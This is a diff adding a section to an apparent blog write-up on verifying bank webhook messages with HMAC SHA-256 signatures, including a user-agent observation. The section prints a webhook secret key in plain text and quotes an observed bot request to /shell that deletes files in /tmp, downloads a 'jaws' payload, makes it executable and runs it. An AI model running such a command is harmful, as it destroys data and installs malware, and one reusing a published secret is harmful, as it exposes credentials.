@@ -191,6 +191,33 @@ The code gets a header name from my **config.py** file. The header in question i
 
 
 ### HMAC Signing and Authentication
+As I mentioned before, the messages that get sent to my code are signed. 
+If you look back at the webhook creation process, the bank provides a secret key
+
+```
+"secretKey": "TIGC3OcKKJOBQ7jClQQ5oLCiDlYPFYsKgKTr",
+```
+
+This secret key is used by the bank to validate the authenticity of the message
+
+The verification process involves:
+
+- Parsing the raw webhook event body
+- Calculating the SHA-256 HMAC signature of the POST request body
+- Comparing the calculated HMAC signature with the value of the X-Up-Authenticity-Signature header
+
+This is a very elegant solution to individual message based authentication. If the value of the header matches the value that I compute using the shared key from the **raw** request body, I can be (relatively) certain that the request is genuine.
+
+I have also noticed that the request contains another header. 
+The user agent appears to be set to **Up Webhook Dispatcher**. This does not appear in the documentation but it is consistent. Theoretically it could be used in conjunction with the HMAC signature to provide another layer of authentication. It's a low bar, but it's there.
+
+I should also note that during my testing. I used a popular cloud provider to host my webhook. I noticed the following approximately five minutes after spinning up my server.
+
+```
+77.3.156.171 - - [13/Aug/2020 12:13:07] "GET /shell?cd+/tmp;rm+-rf+*;wget+x.x.x.x/jaws;chmod+777+/tmp/jaws;sh+/tmp/jaws HTTP/1.1" 404 -
+```
+
+This is an attempt by a BOT to gain access to my server.  I will discuss the security implications in a futher post and perhaps ask one or more guest security experts to comment.
 
 ### Kafka Producer
 
